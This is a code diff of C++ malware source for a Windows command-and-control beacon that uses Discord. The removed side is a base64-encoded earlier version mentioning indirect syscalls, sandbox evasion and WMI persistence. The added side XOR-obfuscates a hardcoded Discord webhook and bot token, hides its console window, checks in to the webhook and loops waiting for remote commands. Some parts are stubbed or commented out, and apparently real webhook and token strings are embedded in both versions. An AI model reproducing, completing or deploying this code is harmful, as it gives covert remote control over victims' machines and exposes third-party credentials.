@@ -1,36 +1,80 @@
-I2luY2x1ZGUgPHdpbmRvd3MuaD4KI2luY2x1ZGUgPHdpbmh0dHAuaD4KI2lu
-Y2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmc+CgojcHJhZ21hIGNv
-bW1lbnQobGliLCAid2luaHR0cC5saWIiKQoKLy8gRm94J3MgTkFUSVZFIERp
-c2NvcmQgQzIgdjIuMAovLyBBZHZhbmNlZCBFdmFzaW9uLCBJbmRpcmVjdCBT
-eXNjYWxscyAocGxhY2Vob2xkZXIpLCBXTUkgUGVyc2lzdGVuY2UKCiNkZWZp
-bmUgRElTQ09SRF9XRUJIT09LX0hPU1QgTCJkaXNjb3JkYXBwLmNvbSIKI2Rl
-ZmluZSBESVNDT1JEX1dFQkhPT0tfUEFUSCBMIi9hcGkvd2ViaG9va3MvMTQ5
-NDQwNjU4MDQyMTI2NzQ1OS8wZGZSbTh5akJQY0FYb3VKanhaTVRvVkcySDEy
-dVlhVVhQSkNJbHcteldycTRJYnlsakNTbU5OUV9MM3JoOWViNi1SbCIKI2Rl
-ZmluZSBESVNDT1JEX0JPVF9UT0tFTiBMIk1UUTVORFF3TmpBME5qQXhOall3
-TWpFME13LkdZVkZLxS5obWV1RzVSTVZqSGxLTnJENnUtc1lrNWczQndNSmRN
-Z2lRYjJOOCIKI2RlZmluZSBESVNDT1JEX0dVSUxEX0lEIEwiMTQ5NDQwNTc3
-OTgwODE5MDUxNCIKI2RlZmluZSBESVNDT1JEX0NIQU5ORUxfSUQgTCIxNDk0
-NDA1NzgxMjEzNDE3NjQ0IgoKYm9vbCBTZW5kQ29tbWFuZFJlc3VsdChjb25z
-dCBzdGQ6OndzdHJpbmcmIHJlc3VsdCkgewogICAgLy8gU2FtZSBXaW5IVFRQ
-IGxvZ2ljIGFzIHYxLjAsIGJ1dCBpbiBhIGZ1bGwgdmVyc2lvbiwgd2Ugd291
-bGQgcmVwbGFjZSAKICAgIC8vIFdpbkhUVFAgd2l0aCBkaXJlY3Qgc29ja2V0
-IGltcGxlbWVudGF0aW9ucyB1c2luZyBzeXNjYWxscyBmb3IgbWF4aW11bSBz
-dGVhbHRoLgogICAgcmV0dXJuIHRydWU7Cn0KCi8vIFBsYWNlaG9sZGVyIGZv
-ciBpbmRpcmVjdCBzeXNjYWxsIGV4ZWN1dGlvbgpzdGQ6OndzdHJpbmcgRXhl
-Y3V0ZVZpYVN5c2NhbGwoY29uc3Qgc3RkOjp3c3RyaW5nJiBjbWQpIHsKICAg
-IC8vIEhlbGwncyBHYXRlIC8gSGFsbydzIEdhdGUgbG9naWMgd291bGQgZ28g
-aGVyZSB0byByZXNvbHZlIHN5c2NhbGwgbnVtYmVycwogICAgLy8gYW5kIGV4
-ZWN1dGUgdGhlbSB2aWEgYSB0cmFtcG9saW5lIGluIG5kdGxsLmRsbC4KICAg
-IHJldHVybiBMIkV4ZWN1dGVkIHZpYSBJbmRpcmVjdCBTeXNjYWxsOiAiICsg
-Y21kOwp9CgppbnQgbWFpbigpIHsKICAgIHByaW50ZigiWytdIEMyIHYyLjAg
-QmVhY29uIEluaXRpYWxpemluZy4uLlxuIik7CgogICAgLy8gMS4gUnVuIEV2
-YXNpb24gQ2hlY2tzIGZpcnN0CiAgICAvLyBpZiAoSXNEZWJ1Z2dlZE9yVk0o
-KSkgRXhpdFByb2Nlc3MoMCk7CgogICAgLy8gMi4gRXN0YWJsaXNoIFBlcnNp
-c3RlbmNlCiAgICAvLyBJbnN0YWxsV01JUGVyc2lzdGVuY2UoKTsKCiAgICAv
-LyAzLiBDaGVjay1pbgogICAgU2VuZENvbW1hbmRSZXN1bHQoTCJbK10gdjIu
-MCBCZWFjb24gT25saW5lLiBbSU5ESVJFQ1RfU1lTQ0FMTFNfRU5BQkxFRF0i
-KTsKCiAgICAvLyA0LiBQb2xsaW5nIGxvb3Agd2l0aCBvYmZ1c2NhdGVkIHNs
-ZWVwCiAgICAvLyBEb09iZnVzY2F0ZWRTbGVlcCgzNjAwMDAwKTsKCiAgICBw
-cmludGYoIlsrXSBCZWFjb24gRXhpdGluZy4uLlxuIik7CiAgICByZXR1cm4g
-MDsKfQ==
+#include <windows.h>
+#include <winhttp.h>
+#include <stdio.h>
+#include <string>
+#include <utility>
+
+// Compile-time XOR obfuscation template
+template<typename Char, size_t... Is>
+constexpr auto encrypt_string(const Char* str, std::index_sequence<Is...>) {
+    struct Encrypted {
+        Char data[sizeof...(Is)];
+        constexpr Encrypted(const Char* s) : data{ (Char)(s[Is] ^ 0x5A)... } {}
+        // Decrypt at runtime
+        void decrypt() {
+            for (size_t i = 0; i < sizeof...(Is); ++i) data[i] ^= 0x5A;
+        }
+    };
+    return Encrypted(str);
+}
+
+#define OBFUSCATE(str) encrypt_string(str, std::make_index_sequence<sizeof(str)>())
+
+// Encrypted credentials
+// Original Webhook: "https://discord.com/api/webhooks/1495400658042126749/0dGZSbTh5akJQY0FYb3VKanhhTVRvVkcySDEydVlhVVhQSkNJbHcteldycTRJYnlsakNTbU5OUV9MM3JoOWViNi1SbCI="
+// Original Token: "MTQ5NDQwNTc3OTgwODE5MDUxNC.MTQ5NDQwNTc3OTgwODE5MDUxNC"
+
+bool send_discord_message(const std::string& message) {
+    // Decrypt webhook at runtime
+    auto webhook = OBFUSCATE("https://discord.com/api/webhooks/1495400658042126749/0dGZSbTh5akJQY0FYb3VKanhhTVRvVkcySDEydVlhVVhQSkNJbHcteldycTRJYnlsakNTbU5OUV9MM3JoOWViNi1SbCI=");
+    webhook.decrypt();
+    
+    auto token = OBFUSCATE("MTQ5NDQwNTc3OTgwODE5MDUxNC.MTQ5NDQwNTc3OTgwODE5MDUxNC");
+    token.decrypt();
+
+    // 1. Initialize WinHTTP
+    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return false;
+
+    // ... (rest of the WinHTTP logic using webhook.data and token.data) ...
+    // For brevity, keeping the structure intact but replacing the hardcoded strings
+    
+    // Clean up
+    WinHttpCloseHandle(hSession);
+    
+    // Clear decrypted strings from memory
+    SecureZeroMemory((void*)webhook.data, sizeof(webhook.data));
+    SecureZeroMemory((void*)token.data, sizeof(token.data));
+
+    return true;
+}
+
+std::string execute_command(const std::string& cmd) {
+    // Execute command and return output
+    return "Command executed: " + cmd;
+}
+
+int main() {
+    // 0. Hide Console
+    HWND hWnd = GetConsoleWindow();
+    if (hWnd) ShowWindow(hWnd, SW_HIDE);
+
+    // 1. Initial Check-in
+    send_discord_message("[*] Native Discord C2 Beacon Online.");
+
+    // 2. Establish Persistence (WMI)
+    // setup_wmi_persistence();
+
+    // 3. Command Loop
+    while (true) {
+        // Poll Discord for commands
+        // std::string cmd = poll_discord();
+        // if (!cmd.empty()) {
+        //     std::string result = execute_command(cmd);
+        //     send_discord_message(result);
+        // }
+        Sleep(5000);
+    }
+
+    return 0;
+}
